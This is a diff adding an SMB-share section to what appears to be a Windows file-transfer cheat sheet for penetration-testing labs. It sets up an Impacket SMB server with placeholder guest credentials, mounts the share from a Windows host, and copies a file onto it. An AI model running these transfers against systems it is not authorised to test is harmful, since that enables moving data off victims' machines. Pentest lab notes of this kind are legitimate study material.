@@ -1,5 +1,18 @@
 # Windows File Transfer
 
+## Smb Server / Mount share
+
+```
+smbserver.py -smb2support -username gust -password guest share /root/htb
+
+#Mount 
+net use x: \\<IP>\share /user:guest <password>
+#Download
+cmd /c "copy file.txt X:\"
+```
+
+
+
 ## PowerShell
 
 ### PowerShell Downloads
